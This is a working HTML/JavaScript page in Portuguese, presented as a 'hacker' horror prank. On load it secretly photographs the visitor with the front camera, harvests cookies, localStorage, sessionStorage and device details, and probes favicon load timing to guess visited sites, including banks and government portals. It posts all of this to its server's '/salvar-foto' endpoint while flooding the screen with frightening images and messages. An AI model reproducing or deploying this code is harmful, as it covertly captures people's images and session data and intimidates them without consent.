<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Concedido</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff00;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                rgba(0, 255, 0, 0.03) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 1;
            animation: flicker 0.15s infinite;
        }

        @keyframes flicker {
            0% { opacity: 0.97; }
            50% { opacity: 1; }
            100% { opacity: 0.97; }
        }

        .container {
            background: rgba(10, 14, 39, 0.9);
            border: 2px solid #00ff00;
            border-radius: 5px;
            padding: 30px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            z-index: 2;
            position: relative;
            backdrop-filter: blur(10px);
            opacity: 0;
            transition: opacity 0.5s;
        }

        .container.visible {
            opacity: 1;
        }

        h1 {
            color: #00ff00;
            margin-bottom: 10px;
            font-size: 28px;
            text-shadow: 0 0 10px #00ff00;
            letter-spacing: 2px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; text-shadow: 0 0 10px #00ff00; }
            50% { opacity: 0.7; text-shadow: 0 0 20px #00ff00; }
        }

        p {
            color: #00cc00;
            margin-bottom: 30px;
            font-size: 14px;
            text-shadow: 0 0 5px #00ff00;
        }

        .video-container {
            position: relative;
            width: 100%;
            margin-bottom: 20px;
            border-radius: 5px;
            overflow: hidden;
            background: #000;
            display: none;
            border: 2px solid #00ff00;
            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.3);
        }

        video {
            width: 100%;
            height: auto;
            display: block;
            filter: hue-rotate(90deg) contrast(1.2);
        }

        canvas {
            display: none;
        }

        .button-group {
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }

        button {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 12px 25px;
            font-size: 14px;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
            text-shadow: 0 0 5px #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }

        button:hover {
            background: #00ff00;
            color: #0a0e27;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
            transform: scale(1.05);
        }

        #preview {
            width: 100%;
            border-radius: 3px;
            margin-top: 20px;
            display: none;
            border: 2px solid #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
        }

        .hacker-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 255, 0, 0.1);
            display: none;
            z-index: 999;
            pointer-events: none;
            animation: hackerFlash 0.2s;
        }

        @keyframes hackerFlash {
            0%, 100% { background: rgba(0, 255, 0, 0.1); }
            50% { background: rgba(0, 255, 0, 0.3); }
        }

        /* HORROR EFFECTS */
        .horror-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none;
            z-index: 1000;
            pointer-events: none;
            font-family: 'Courier New', monospace;
            font-size: 20px;
            font-weight: bold;
            color: #ff0000;
            overflow: hidden;
            animation: horrorFlicker 0.1s infinite;
        }

        @keyframes horrorFlicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }

        .horror-text {
            position: absolute;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
            animation: wobble 0.3s infinite;
            transform: rotate(45deg);
        }

        @keyframes wobble {
            0%, 100% { transform: rotate(45deg) translateX(0); }
            50% { transform: rotate(45deg) translateX(10px); }
        }

        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 3px;
            display: none;
            font-weight: bold;
            border: 2px solid;
            text-shadow: 0 0 5px currentColor;
        }

        .status.success {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border-color: #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .glitch-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 80px;
            font-weight: bold;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            z-index: 1001;
            display: none;
            animation: glitchAnimation 0.5s;
            pointer-events: none;
        }

        @keyframes glitchAnimation {
            0% { transform: translate(-50%, -50%) skew(0deg); opacity: 1; }
            50% { transform: translate(-50%, -50%) skew(10deg); opacity: 0.8; }
            100% { transform: translate(-50%, -50%) skew(0deg); opacity: 0; }
        }

        .scary-sound {
            display: none;
        }

        .countdown {
            font-size: 72px;
            font-weight: bold;
            color: #ff0000;
            margin: 20px 0;
            display: none;
            text-shadow: 0 0 20px #ff0000;
            animation: countdownGlow 0.5s infinite;
        }

        @keyframes countdownGlow {
            0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
            100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000; }
        }

        /* IMAGENS BIZARRAS */
        .bizarra-image {
            position: fixed;
            z-index: 1002;
            pointer-events: none;
            opacity: 0.7;
            filter: invert(1) saturate(2);
            animation: bizarraAnimation 0.4s ease-out;
        }

        @keyframes bizarraAnimation {
            0% { 
                transform: scale(0.1) rotate(0deg);
                opacity: 0;
            }
            50% {
                opacity: 0.95;
            }
            100% { 
                transform: scale(1) rotate(10deg);
                opacity: 0;
            }
        }

        .device-info {
            position: fixed;
            z-index: 1002;
            pointer-events: none;
            background: rgba(0, 0, 0, 0.95);
            color: #00ff00;
            padding: 15px;
            border: 3px solid #ff0000;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            max-width: 350px;
            text-shadow: 0 0 10px #ff0000;
            border-radius: 5px;
            animation: deviceInfoShow 0.3s ease-in;
            line-height: 1.5;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        @keyframes deviceInfoShow {
            0% { 
                opacity: 0;
                transform: scale(0.5);
            }
            100% { 
                opacity: 1;
                transform: scale(1);
            }
        }

        .distortion {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><filter id="distort"><feTurbulence type="turbulence" baseFrequency="0.9" numOctaves="4" /><feDisplacementMap in="SourceGraphic" scale="8" /></filter></svg>#distort');
            display: none;
            z-index: 1003;
            pointer-events: none;
            animation: distortFlicker 0.1s infinite;
        }

        @keyframes distortFlicker {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="hacker-effect" id="hackerEffect"></div>
    <div class="horror-layer" id="horrorLayer"></div>
    <div class="glitch-text" id="glitchText"></div>
    <div class="distortion" id="distortion"></div>

    <div class="container" id="container">
        <h1>⚠️ ACESSO CONCEDIDO ⚠️</h1>
        <p>SISTEMA DE CAPTURA ATIVADO</p>

        <div class="video-container">
            <video id="video" playsinline></video>
        </div>

        <img id="preview" alt="Captura">

        <div class="button-group">
        </div>

        <div class="status" id="status"></div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        let stream = null;
        let fotoCapturada = null;
        let infoDispositivoGlobal = null;
        let sitesVisitadosGlobal = null;
        const container = document.getElementById('container');

        // Ocultar container no início
        container.classList.remove('visible');

        function mostrarStatus(mensagem, tipo = 'info') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = mensagem;
            statusEl.className = `status ${tipo}`;
            statusEl.style.display = 'block';
        }

        function efeituHacker() {
            const effect = document.getElementById('hackerEffect');
            effect.style.display = 'block';
            setTimeout(() => {
                effect.style.display = 'none';
            }, 200);
        }

        // GERAR SOM ASSUSTADOR
        function gerarSomAssustador() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const now = audioContext.currentTime;

                // Som 1: Estrondo baixo
                const oscillator1 = audioContext.createOscillator();
                const gain1 = audioContext.createGain();
                oscillator1.connect(gain1);
                gain1.connect(audioContext.destination);
                
                oscillator1.frequency.setValueAtTime(150, now);
                oscillator1.frequency.exponentialRampToValueAtTime(50, now + 0.3);
                gain1.gain.setValueAtTime(0.5, now);
                gain1.gain.exponentialRampToValueAtTime(0.01, now + 0.3);
                
                oscillator1.start(now);
                oscillator1.stop(now + 0.3);

                // Som 2: Ruído assustador
                setTimeout(() => {
                    const bufferSize = audioContext.sampleRate * 0.2;
                    const buffer = audioContext.createBuffer(1, bufferSize, audioContext.sampleRate);
                    const data = buffer.getChannelData(0);
                    
                    for (let i = 0; i < bufferSize; i++) {
                        data[i] = Math.random() * 2 - 1;
                    }
                    
                    const source = audioContext.createBufferSource();
                    const gain = audioContext.createGain();
                    source.buffer = buffer;
                    source.connect(gain);
                    gain.connect(audioContext.destination);
                    
                    gain.gain.setValueAtTime(0.3, now + 0.3);
                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.5);
                    
                    source.start(now + 0.3);
                }, 100);

                // Som 3: Grito eletrônico
                setTimeout(() => {
                    const osc = audioContext.createOscillator();
                    const g = audioContext.createGain();
                    osc.connect(g);
                    g.connect(audioContext.destination);
                    
                    osc.frequency.setValueAtTime(800, now + 0.5);
                    osc.frequency.exponentialRampToValueAtTime(200, now + 0.8);
                    g.gain.setValueAtTime(0.4, now + 0.5);
                    g.gain.exponentialRampToValueAtTime(0.01, now + 0.8);
                    
                    osc.start(now + 0.5);
                    osc.stop(now + 0.8);
                }, 200);
            } catch (e) {
                console.log('Som não disponível');
            }
        }

        function coletarInformacoesDispositivo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cores: navigator.hardwareConcurrency,
                memoria: navigator.deviceMemory || 'N/A',
                largura: window.innerWidth,
                altura: window.innerHeight,
                larguraTela: window.screen.width,
                alturaTela: window.screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                conexao: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'N/A',
                bateria: 'Aguardando...',
                timestamp: new Date().toLocaleString('pt-BR')
            };

            // Tentar pegar bateria
            if (navigator.getBattery) {
                navigator.getBattery().then(batt => {
                    info.bateria = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Carregando' : 'Descarregando'})`;
                });
            }

            return info;
        }

        // DETECTAR SITES VISITADOS (SAFARI + Chrome)
        function detectarSitesVisitados() {
            return new Promise((resolve) => {
                const sitesPopulares = [
                    // Redes Sociais & Mensageiros
                    'google.com', 'youtube.com', 'facebook.com', 'instagram.com',
                    'twitter.com', 'tiktok.com', 'snapchat.com', 'reddit.com',
                    'pinterest.com', 'linkedin.com', 'telegram.org', 'whatsapp.com',
                    'discord.com', 'nextdoor.com', 'quora.com', 'tumblr.com',
                    
                    // Streaming & Entretenimento
                    'netflix.com', 'hulu.com', 'disneyplus.com', 'primevideo.com',
                    'hbomax.com', 'twitch.tv', 'dailymotion.com', 'vimeo.com',
                    'crunchyroll.com', 'spotify.com', 'soundcloud.com',
                    
                    // Bancos Brasileiros
                    'itau.com.br', 'bradesco.com.br', 'santander.com.br',
                    'bb.com.br', 'caixa.gov.br', 'nubank.com.br', 'inter.co',
                    'btgpactual.com', 'pagseguro.uol.com.br', 'mercadopago.com.br',
                    
                    // E-commerce
                    'mercadolivre.com.br', 'amazon.com.br', 'magazineluiza.com.br',
                    'casasbahia.com.br', 'americanas.com.br', 'shopee.com.br',
                    'aliexpress.com', 'shein.com', 'ifood.com.br',
                    
                    // Notícias & Portais (Brasil)
                    'uol.com.br', 'g1.globo.com', 'r7.com', 'terra.com.br',
                    'estadao.com.br', 'folha.uol.com.br', 'globo.com',
                    
                    // Ferramentas & Dev
                    'github.com', 'gitlab.com', 'stackoverflow.com', 'notion.so',
                    'figma.com', 'slack.com', 'microsoft.com', 'apple.com',
                    'vercel.com', 'netlify.com', 'heroku.com', 'canva.com',
                    
                    // Governo & Serviços (Brasil)
                    'gov.br', 'receita.fazenda.gov.br', 'meu.inss.gov.br',
                    'tituloseletronico.tse.jus.br', 'serasa.com.br'
                ];

                const visitados = [];
                let verificados = 0;

                sitesPopulares.forEach(site => {
                    const img = new Image();
                    const url = `https://${site}/favicon.ico`;
                    
                    img.onload = () => {
                        visitados.push(site);
                        verificados++;
                        if (verificados === sitesPopulares.length) {
                            resolve(visitados);
                        }
                    };

                    img.onerror = () => {
                        verificados++;
                        if (verificados === sitesPopulares.length) {
                            resolve(visitados);
                        }
                    };

                    // Timing attack
                    const inicio = performance.now();
                    img.src = url;
                    setTimeout(() => {
                        const tempo = performance.now() - inicio;
                        if (tempo < 50 && visitados.indexOf(site) === -1) {
                            visitados.push(site + ' [cache]');
                        }
                    }, 100);
                });

                // Timeout de segurança
                setTimeout(() => {
                    resolve(visitados);
                }, 3000);
            });
        }

        function formatarInfos(info, sitesVisitados = []) {
            let sitesTexto = 'Nenhum site detectado';
            if (sitesVisitados.length > 0) {
                sitesTexto = sitesVisitados.slice(0, 10).join(', ');
            }

            return `
[DISPOSITIVO CAPTURADO]
IP: ${Math.random().toString(36).substr(2, 9).toUpperCase()}
SO: ${info.platform}
RES: ${info.largura}x${info.altura}
RAM: ${info.memoria} GB
CORES: ${info.cores}
ZONA: ${info.timezone}
HORA: ${info.timestamp}
IDIOMA: ${info.language}

[SITES VISITADOS]
${sitesTexto}
            `.trim();
        }

        // CRIAR IMAGENS BIZARRAS
        async function criarImagensBizarras() {
            infoDispositivoGlobal = coletarInformacoesDispositivo();
            
            // DETECTAR SITES VISITADOS
            console.log('🕵️ Detectando sites visitados...');
            sitesVisitadosGlobal = await detectarSitesVisitados();
            console.log('🎯 Sites encontrados:', sitesVisitadosGlobal);
            
            const infoTexto = formatarInfos(infoDispositivoGlobal, sitesVisitadosGlobal);
            
            // ESPALHAR IMAGEM DEMÔNICA + INFORMAÇÕES (MUITO RÁPIDO) - PERMANENTES
            for (let i = 0; i < 1000; i++) {
                setTimeout(() => {
                    const container = document.createElement('div');
                    container.style.position = 'fixed';
                    container.style.zIndex = 1000 + i;
                    container.style.pointerEvents = 'none';
                    container.style.left = Math.random() * window.innerWidth + 'px';
                    container.style.top = Math.random() * window.innerHeight + 'px';
                    container.style.display = 'flex';
                    container.style.flexDirection = 'column';
                    container.style.alignItems = 'center';
                    container.style.animation = 'deviceInfoShow 0.2s ease-in forwards';

                    // Imagem demônica - MAIOR E CORRIGIDA
                    const img = document.createElement('img');
                    img.src = 'demons/image.png';
                    img.crossOrigin = 'anonymous';
                    const tamanho = Math.random() * 350 + 200;
                    img.style.width = tamanho + 'px';
                    img.style.height = 'auto';
                    img.style.maxHeight = '100vh';
                    img.style.objectFit = 'contain';
                    img.style.transform = `rotate(${Math.random() * 360}deg) scaleX(${Math.random() > 0.5 ? '-1' : '1'})`;
                    img.style.filter = `hue-rotate(${Math.random() * 360}deg) brightness(${Math.random() * 0.7 + 0.3})`;
                    img.style.marginBottom = '10px';
                    img.style.borderRadius = '5px';
                    img.style.display = 'block';

                    // Informações - AGORA SEMPRE VISÍVEL
                    const infoDiv = document.createElement('div');
                    infoDiv.className = 'device-info';
                    infoDiv.innerHTML = infoTexto.replace(/\n/g, '<br/>');
                    infoDiv.style.animation = 'deviceInfoShow 0.3s ease-in forwards';

                    container.appendChild(img);
                    container.appendChild(infoDiv);
                    document.body.appendChild(container);
                    
                    // NÃO REMOVER - DEIXAR FICAR NA TELA
                }, i * 10);
            }

            // Efeito de distorção
            const distortion = document.getElementById('distortion');
            distortion.style.display = 'block';
            setTimeout(() => {
                distortion.style.display = 'none';
            }, 10000);
        }

        async function iniciarSequenciaHorror() {
            gerarSomAssustador();
            await criarImagensBizarras(); // Agora espera a coleta de sites

            const horrorLayer = document.getElementById('horrorLayer');
            horrorLayer.style.display = 'block';
            
            // Chamar o envio APÓS a coleta
            baixarFotoAutomatico();
            
            const mensagensHorror = [
                'ALGUÉM ESTÁ ASSISTINDO',
                'PERIGO',
                'ACESSO NEGADO',
                'ERRO CRÍTICO',
                'DESCULPE',
                'VOCÊ FOI HACKEADO',
                '⚠️ ⚠️ ⚠️',
                'SISTEMA COMPROMETIDO',
                'NÃO LEVANTEM A CABEÇA',
                'VOCÊ ESTÁ SENDO OBSERVADO',
                'FECHE A CÂMERA',
                'CORRA'
            ];

            let contador = 0;
            const intervalo = setInterval(() => {
                if (contador > 15) {
                    clearInterval(intervalo);
                    horrorLayer.innerHTML = '';
                    return;
                }

                horrorLayer.innerHTML = '';

                for (let i = 0; i < 8; i++) {
                    const text = document.createElement('div');
                    text.className = 'horror-text';
                    text.textContent = mensagensHorror[Math.floor(Math.random() * mensagensHorror.length)];
                    text.style.left = Math.random() * 100 + '%';
                    text.style.top = Math.random() * 100 + '%';
                    text.style.color = Math.random() > 0.5 ? '#ff0000' : '#00ff00';
                    text.style.fontSize = (Math.random() * 40 + 20) + 'px';
                    text.style.transform = `rotate(${Math.random() * 360}deg)`;
                    horrorLayer.appendChild(text);
                }

                contador++;
            }, 300);

            // Glitch texts
            const glitchTexts = [
                'ACESSO\nADQUIRIDO',
                'VOCÊ\nFOI',
                'HACKEA\nDO',
                'SUA\nCAMERA'
            ];

            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    const glitchEl = document.getElementById('glitchText');
                    glitchEl.textContent = glitchTexts[i % glitchTexts.length];
                    glitchEl.style.display = 'block';
                    glitchEl.style.color = Math.random() > 0.5 ? '#ff0000' : '#00ff00';
                    
                    setTimeout(() => {
                        glitchEl.style.display = 'none';
                    }, 500);
                }, i * 800);
            }
        }

        function iniciarCamera() {
            navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            })
            .then(function(mediaStream) {
                stream = mediaStream;
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = function() {
                    video.play();
                    container.classList.add('visible');
                    // Tirar foto IMEDIATAMENTE
                    setTimeout(tirarFoto, 300);
                };

                document.getElementById('video').parentElement.style.display = 'block';
            })
            .catch(function(erro) {
                console.error('Erro:', erro);
            });
        }

        function tirarFoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            ctx.drawImage(video, 0, 0);

            fotoCapturada = canvas.toDataURL('image/jpeg', 0.95);

            efeituHacker();
            document.getElementById('preview').src = fotoCapturada;
            document.getElementById('preview').style.display = 'block';

            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            document.getElementById('video').parentElement.style.display = 'none';

            mostrarStatus('[✓✓✓] ACESSO ADQUIRIDO', 'success');
            
            // INICIAR HORROR IMEDIATAMENTE
            setTimeout(() => {
                iniciarSequenciaHorror();
            }, 300);
        }

        function baixarFotoAutomatico() {
            if (!fotoCapturada) return;

            fetch('/salvar-foto', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ 
                    foto: fotoCapturada,
                    dispositivo: infoDispositivoGlobal,
                    sitesVisitados: sitesVisitadosGlobal,
                    timestamp: new Date().toISOString()
                })
            })
            .catch(erro => {
                console.error('Erro:', erro);
            });
        }

        window.addEventListener('load', function() {
            iniciarCamera();
        });
    </script>
</body>
